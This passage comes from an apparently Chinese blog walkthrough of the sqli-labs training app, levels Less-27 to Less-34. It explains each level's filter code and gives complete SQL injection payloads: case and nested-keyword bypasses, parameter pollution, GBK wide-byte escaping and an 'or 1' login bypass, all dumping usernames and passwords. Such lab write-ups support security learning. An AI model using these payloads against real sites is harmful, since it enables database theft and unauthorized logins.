<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 过滤了 /*</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># 过滤了 -</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># 过滤了 #</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># 过滤了空格</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[ +]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># 过滤了 select /m 严格模式 不可以使用双写绕过</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/m'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/Select/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/SELECT/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># 过滤了 union UNION</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/union/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/Union/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/UNION/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>union 和 select 没有忽略大小写 导致写了很多冗杂的规则，但还是可以轻易绕过。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 大小写混写</span>
unioN
unIon
seLect
<span class="token punctuation">..</span>.

<span class="token comment"># 嵌套双写</span>
uunionnion
sselectelect
ununionion
<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>很多种方案，不再赘述，下面直接丢 payload：</p>
<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;100&#39;%0bununionion%0bseLect%0b1,(seLect(@x)FROM(seLect(@x:&#x3D;0x00) ,(seLect(@x)FROM(users)WHERE(@x)IN(@x:&#x3D;CONCAT(0x20,@x,username,password,0x3c62723e))))x),3%0band%0b&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、布尔盲注、延时盲注</td>
<td align="left"><code>id=&quot;$id&quot;</code></td>
</tr>
</tbody></table>
<p>和 Less-27 相比，只是拼接方式发生了改变，又因为没有报错日志的输出，所以少了报错注入的利用方式，利用方式换汤不换药，这里不做演示了。</p>
<h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、布尔盲注、延时盲注</td>
<td align="left"><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody></table>
<p>过滤规则如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 过滤 /*</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># 过滤 - # 注释</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># 过滤 空格 +</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[ +]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">.</span>

<span class="token comment"># 过滤 union select /i 大小写都过滤</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/union\s+select/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里 union 和 select 这里可以使用双写嵌套绕过，过滤了注释的话 就使用闭合绕过，过滤了空格使用 Less-26 的编码绕过，OK分析完成后直接放完整的 payload 吧：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;100&#39;)%0bunion%a0select%0b1,(SELECT%0bGROUP_CONCAT(username,password%0bSEPARATOR%0b0x3c62723e)%0bFROM%0busers),3%a0and%0b(&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、布尔盲注、延时盲注</td>
<td align="left"><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody></table>
<p>比 Less-27 还少了几个过滤规则，这样直接丢 payload 吧：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39;) union%a0select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody></table>
<p>这一题和注入天书里面描述的环境不太一样，还是具体分析看下代码吧。</p>
<ul>
<li><code>index.php</code></li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># id = 'x' 的拼接方式</span>
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> 查询到结果<span class="token punctuation">:</span>
    输出查询的详细信息
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>从源码来看的话和前面的貌似没有啥区别，直接尝试联合注入看看吧：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">index.php?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这个 index.php 太简单了，不知道啥意思，下面直接重点来看 login.php 吧：</p>
<ul>
<li><code>login.php</code></li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 查询 query 的字符串</span>
<span class="token variable">$qs</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment"># 模拟 tomcat 的查询函数 处理一下</span>
<span class="token variable">$id1</span><span class="token operator">=</span><span class="token function">java_implimentation</span><span class="token punctuation">(</span><span class="token variable">$qs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment"># 再次过滤检测</span>
<span class="token function">whitelist</span><span class="token punctuation">(</span><span class="token variable">$id1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> 查询到结果<span class="token punctuation">:</span>
    输出查询的详细信息
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">></span>

<span class="token keyword">function</span> <span class="token function-definition function">java_implimentation</span><span class="token punctuation">(</span><span class="token variable">$query_string</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$q_s</span> <span class="token operator">=</span> <span class="token variable">$query_string</span><span class="token punctuation">;</span>
    <span class="token comment"># &amp; 作为分隔符 分割字符串</span>
    <span class="token variable">$qs_array</span><span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span><span class="token variable">$q_s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment"># 遍历 qs_array 数组</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$qs_array</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>    
        <span class="token variable">$val</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment"># 如果数组前两位是 id 的话</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token operator">==</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>    
            <span class="token comment"># 截取 $value 的3-30 的字符串 作为 id 的值 </span>
            <span class="token variable">$id_value</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
            <span class="token keyword">return</span> <span class="token variable">$id_value</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">whitelist</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token comment"># 过滤规则 检测数字</span>
    <span class="token variable">$match</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^\d+$/"</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> 不符合规则：
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: hacked.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>从代码中还是很容易发现问题的，关键问题出在下面的地方：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$id1</span><span class="token operator">=</span><span class="token function">java_implimentation</span><span class="token punctuation">(</span><span class="token variable">$qs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">...</span>
<span class="token function">whitelist</span><span class="token punctuation">(</span><span class="token variable">$id1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
whitelist<span class="token string backtick-quoted-string">` 过滤是比较严格的，如果 id 不是数字的话就会直接重定向到 `</span>hacked<span class="token operator">.</span>php<span class="token string backtick-quoted-string">`，这里是没毛病的。那么问题出在了这里函数`</span><span class="token variable">$id1</span><span class="token operator">=</span><span class="token function">java_implimentation</span><span class="token punctuation">(</span><span class="token variable">$qs</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>因为 return 表示了函数的结束运行，所以这个函数捕捉到 id 的时候就会返回 <code>return $id_value</code>，这样就导致了 用户加入构造两组 id 的话，那么后面的 id 就会绕过函数检测。</p>
<p>假设用户输入这样的语句：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">index<span class="token operator">.</span>php<span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>id<span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Apache PHP 会解析最后一个参数</p>
<p>Tomcat JSP 会解析第一个参数</p>
<p>知道这个原理的话后面尝试直接注入吧：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">login.php?id&#x3D;1&amp;id&#x3D;-2&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=&quot;$id&quot;</code></td>
</tr>
</tbody></table>
<p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p>
<h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=（&quot;$id&quot;）</code></td>
</tr>
</tbody></table>
<p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p>
<h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p>考察 Bypass addslashes()，关键的防护代码如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># 在' " \ 等敏感字符前面添加反斜杠</span>
<span class="token keyword">function</span> <span class="token function-definition function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>        <span class="token comment"># \ 转换为 \\</span>
    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span> <span class="token function">preg_quote</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">)</span> <span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\\\\\"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          将       <span class="token comment"># 将 ' 转为\"</span>
    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\'/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\\''</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
      <span class="token comment"># 将 " 转为\"</span>
    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\"/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\\""</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                
    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>宽字节注入原理</strong></p>
<p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 <code>%aa%5c</code> 就是一个 汉字。因为过滤方法主要就是在敏感字符前面添加 反斜杠 <code>\</code>，所以这里想办法干掉反斜杠即可。</p>
<ol>
<li><code>%df</code> 吃掉 <code>\</code></li>
</ol>
<p>具体的原因是 <code>urlencode(\&#39;) = %5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形 成<code>%df%5c%27</code>，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把<code>%df%5c</code> 当做是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p>
<ol>
<li>将 <code>\&#39;</code> 中的 <code>\</code> 过滤掉</li>
</ol>
<p>例如可以构造 <code>%5c%5c%27</code> 的情况，后面的<code>%5c</code>会被前面的<code>%5c</code> 给注释掉。这也是 bypass 的一种方法。</p>
<p>本关卡采用第一种 %df 宽字节注入来吃掉反斜杠，下面直接丢 payload 吧：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1%df&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p>拼接方式也是一样的，过滤方法细节有点变化，具体如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$string</span><span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>addslashes()</code> 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<table>
<thead>
<tr>
<th align="left">预定义字符</th>
<th align="left">转义后</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>\</code></td>
<td align="left"><code>\\</code></td>
</tr>
<tr>
<td align="left"><code>&#39;</code></td>
<td align="left"><code>\&#39;</code></td>
</tr>
<tr>
<td align="left"><code>&quot;</code></td>
<td align="left"><code>\&quot;</code></td>
</tr>
</tbody></table>
<p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。</p>
<blockquote>
<p>注入天书：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞</p>
</blockquote>
<h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>username=&#39;$uname&#39;</code></td>
</tr>
</tbody></table>
<p>过滤方法依然和 Less-33 一致：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$uname1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$passwd</span><span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$passwd1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>只是由 GET 型变成了 POST 型，所以下面直接丢 POST 的数据包 payload 了：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;admin%df&#39; union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;233<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>MySQL 注入天书这里介绍了一个新的方法</p>
<p>将 utf-8 转换为 utf-16 或 utf-32，例如将 <code>&#39;</code> 转为 utf-16 为<code>�</code></p>
<p>我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">➜  ~ <span class="token builtin class-name">echo</span> <span class="token punctuation">\</span>'<span class="token operator">|</span><span class="token function">iconv</span> -f utf-8 -t utf-16
��<span class="token string">'
➜  ~ echo \'</span><span class="token operator">|</span><span class="token function">iconv</span> -f utf-8 -t utf-32
��'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先尝试一个经典的万能密码：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;�&#39; or 1#&amp;passwd&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>为什么这个万能密码可以生效呢，因为拼接到 SQL 中是如下的效果：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">'�'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#and password='$passwd' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>or 1</code> 是一个永真的条件，不论 select 选择出的内容是什么。<code>or 1</code> 之后时钟都是 1，下面是控制后台的演示：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># where username = 'x' or 1</span>
mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where username <span class="token operator">=</span> <span class="token string">'x'</span> or <span class="token number">1</span><span class="token punctuation">;</span>
+----+---------------+------------+
<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username      <span class="token operator">|</span> password   <span class="token operator">|</span>
+----+---------------+------------+
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> Dumb          <span class="token operator">|</span> Dumb       <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> Angelina      <span class="token operator">|</span> I-kill-you <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span> Dummy         <span class="token operator">|</span> p@ssword   <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">4</span> <span class="token operator">|</span> secure        <span class="token operator">|</span> crappy     <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">5</span> <span class="token operator">|</span> stupid        <span class="token operator">|</span> stupidity  <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">6</span> <span class="token operator">|</span> superman      <span class="token operator">|</span> genious    <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">7</span> <span class="token operator">|</span> batman        <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">8</span> <span class="token operator">|</span> admin         <span class="token operator">|</span> <span class="token number">233</span>        <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">9</span> <span class="token operator">|</span> admin1        <span class="token operator">|</span> admin1     <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">10</span> <span class="token operator">|</span> admin2        <span class="token operator">|</span> admin2     <span class="token operator">|</span>
